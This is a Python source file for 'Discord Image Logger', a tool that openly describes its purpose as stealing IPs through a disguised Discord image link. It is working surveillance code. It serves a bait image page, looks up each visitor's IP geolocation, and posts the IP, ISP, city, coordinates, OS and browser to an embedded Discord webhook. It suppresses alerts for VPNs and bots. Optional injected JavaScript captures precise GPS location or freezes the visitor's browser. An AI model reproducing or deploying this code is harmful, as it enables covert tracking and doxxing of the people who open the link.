# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445754802624790598/-XMgvJ8lbu6MrMZaCUPYPXXMKG0heYMzexDNevRQlR7CmU7LVuoiWd-Lm3u1VvVppBL- !",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAIkAsQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgQBAwUGB//EADsQAAIBAwIDBQQIBQQDAAAAAAECAAMEERIhBTFBEyJRYXEykaGxBhQjM0JSgdGCweHw8TRicnMVJFP/xAAZAQEBAQEBAQAAAAAAAAAAAAAAAQIDBAX/xAAgEQEBAQEAAgEFAQAAAAAAAAAAARECAzEhBBIiMlFB/9oADAMBAAIRAxEAPwD5zERPoBERAyFLNpUEnwE9X9HOE1bQ/W7gqGKFQg6esrfRSw77X1VeW1PPXznpyQdyN5YA3kWiowRc9JXS5AUB+8xi2SjeM6cTIGxPhGRtvzmus+lG9IvUxEywC5JwJKVQWqi2D8samljUuornccxJOtGdW+IzsD4yLFagABG4yDNVrVFTKk7jkJdFiarq3p3VBqNTUFb8rYxJnK95dwBnT+0yCCARyMDzVx9FmJLWlcYHJag5/qJSb6PcQXfTSA8TU2npeKpxEp2nDqqgqN6bKMn0M8ff3XEH7l5UqqfykFZKrRXpijVamHDlebLymuMY2IA8AIgIiICIiAiIgBucDc+U6nDeEGuvbXzihbDmznBacxSyHUrYbxEkWq3FRQzlixwNRJyYHvOH16FWmFs1+xp90MBt5y1iaLG3Wzs6Nuo9hcHHUyxmWIr3Ld0+AlOmna1Que6p3PhLdy4BIPJMk+sq57O3b81VsE+QnLv2rbTq9teAgdxBlZG9q991U8k+JMhZsF7Zj0UyuwJJOckgZmL18GOgHQU6VQHuqhBM0UauXrViNmBHn/fKRz/6P8WJrqns0CjphfXqf5SXoxO3qaXotudJIxFw/YXRajtg5xNGrBUD1knOsktzMzOvhrHR+sqCjEjRUzg+B8JNu6SOh39Jx8j6u6vkqMEHwP8AiXLK47UChUPfG6N4+v8AfKdOfJtys4vqSRpPNfjOFe8dtNT0ruxdmQ4ZWCnHpOxSfA7+x5HPy/Scj6T8MNZBeW65qp7YUe0Ok7e4OLcXtg3+n4aqHxZs/Cc921Pq0qPIcpiJMCIiUIiICIiAnU+jVqbniaM/sURrPr0nL6c56WwdOB8MavXIa5r7in1x0zA9BcVDSQFRkk4E2ASjRepUpWj3G1SodTAchmX4iKNzTZQx597Jka6YoYPNcL+/zk7ltKIeYZs+6V69c1dW3d5zl3mtRBDhWA/EfhMAauXhmEGynwkqOPtvKnt7/wCk5+xgnACdCxMjV3xnrvNjrup6AZ+Er0SalFXPQkfGSrjB9tR1wZK1PaGqDzXV8P8AEiu4qOenL34kbVhRqEnohJ88ZzMQSUaldD+NTj1x/maXbuLo2fZlx0PSbaR0KzH8NMn3CUWuuw+z7Ms5JAQDJY9ceUlMd2zr/WArt3TVUhgN9LDYj5H9JtrVKnYG4tkFVtPep55+k4nDL9bGvXTiFekT3XVQBjJGDNl+1e3t9drWZKlHdlH5Dv8AtPRz3sZricRr2lZzUtrd6NTque7Kc33V011V7R0RKh9ortn9JonYIiICIiAiIgTpVWpPqQLnpkZxL3CbarxPiKm4ZmVe/UZue2+Jz6aNUYKgyTy3nq7G4sOCWnZVaweu27imck+UDtsikqWG43A8OkyxwhJ5iect+L1+KcVpW9JTToB9TeLAb7+6ejbdWBlRUux9wvrKQ3VgPAmW7skKah9ok4HkBKOSFdhy0ETzd/s1G9BlP4h7jMUdluCdgKY/mZFW006zPuBRLD1GD+8wD2lpcFeZpqR75BtdgaeQdgso27MEqhNjsct1yOksZ0UWqHl2ev55+InMr3bC6FC0XtHKkEL5TPW6q5mmKRTWdRIyAc7D+vykNQLEjfUFxj3mVfqRQs3FLyrpCB1p0zhix6fOV6K5pPc0w1NM4RS258TOd3m5T27Iol6yIdlfGZpv7C64e9zdrS1u6lUqO5winbI8TvORYcUuba67ZPtVUZKt4eU9rf8A0dPFeDfXnZbi5qjWEJwEQg4Vc+GRH5R0k14DiYahptk0kEb4/FyxNv1u6tq4Ru7cU6YpOSch15rn9CBHDaXa8SAvToFvvU17YC9P1M0Xlb6zd1bjGO0b3L0+U9Hi4/H7nO+2HZS2pF0+XORiJ3ZIiICIiAiIgNxjB5HYx15HPgBvE229w9u2qmE19H05Igen4BYpw22e5vXVKjr+M4wstWfFkvuItb265oohZn8TtsPLnPG17itctqr1Gf1M7HBK68MsLi8YjVUxTpqebYjR3+KamRFU7nl/OU30rb3Ofw0ifdKnDrs3Fo9au7AIwQH1lm42pH8oI1emRmefu/OrGtqy/VKhydqeBsd9pClXAt7mmDsEYZ9RFYalZSGK8tvSQRtCFhSJGhkdSO8Rj59Zw+6riVW4H1dl0ncFdh0J/p8YZrl17O2oDSTnVo3Hp4SdKkK1AHJIIRxnaXRTA5Fhy6zN6dOeNVqFjc07Wv3rU1aqlTUdmd8eA6CcG7uNNlTtx7akqSPHPynp+y3xqOPWcziPBKd1U7Sk+hv924k1q8fxzeGW6raPXIzqXC+c9jZX1xa21KjTbCU0ChD0nGs+Gii9OpXftGpju7YA/SdHpnpF61eOc9tfERRv7qjcV7embjO7gbsB4+k8bXwa9bAwO0bA8N57CrWp03wBlsFthyHWeMyTlj13M7/TbrHlwiInrcSIiAiIgIiICIiAknqPUVFY7KMAeEjEC/bMeyoWitvUrh29J6NlV6Tsv3LbDO+R4zyVqha4VVbSDszHoPGdavxja5pUMLRp0OyoqfPG/uzOfUmrFutoWqaYYMuAFfGzDHj0M1W9J6VRy5Lod1yc6PIGUeB1C4qUzlhscnpsNp0zSZfuXan6bj+/TE8XXtpaosGIGysssZnJdXSolakftEwMH8S+H7S+l1T/ABMo9TM2OvHcWImAQRkb+kZmXeIVqjUlyKVSqfy01lOuarANcO9Jf/lQOWf1bp6ToDYgcieXSY5Z2G3LERiy1zqrVV4dct2S0VWk2lQck7dT4zy49nE9dxdscLudsfZGeSnr+m9Vw8pERPU5EREBERAREQEREBERAhWZkXY9cZlY5OMknHPzm64PdA8TNU8nltnTU9O59HqlKnTqKzrrLbITg4na5naeJIBOT8P3lm3vbi39itUI8NWROOK9Wy+nvkCM8xq9Zy6XFq4GWWmw9MTf/wCVpt7VJl9DmWQ9LQoIDqUaPJCV+Ul9uPu7qsnuI+IMqrxO0JwztT9Vm6ndW9T2K9JvRxJYu0u764sqXamrSc50gNTwc/oZWX6QVj7dvTP/ABYyn9IKwdqdMclBbY9Zy6dXT5zfE4/1b1XVv+KV75NDqtNPyr19ZSmAQRkcpmezmST4c7bSIiaQiIgIiICIiAiIgIiYJxzgaLo4K+UgJOspZ8TBBBwRPF5LvTTEREwrZSqFDg8pYBB5SnJ03Kc95ZUsKpJ7jcvfIHy+M31QrJqXeaIpA5bmT4ZMEA+URMq2URp65WbpCmuFwZOe7iZywRETYREQEREBERAREQEi/tY6iSms/etMeS5ysa6x1VM8pkVTjDLq85F/amJ4mgxExIM5gDPKRmYG2kGAwBkTFRdM2W0zcTdjPpXm23otWLBFyVGo+k1To8E/1h/6j8xHH7NX4V8dJmZb72p/yMxPbHOEREqkREBERA//2Q== !", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
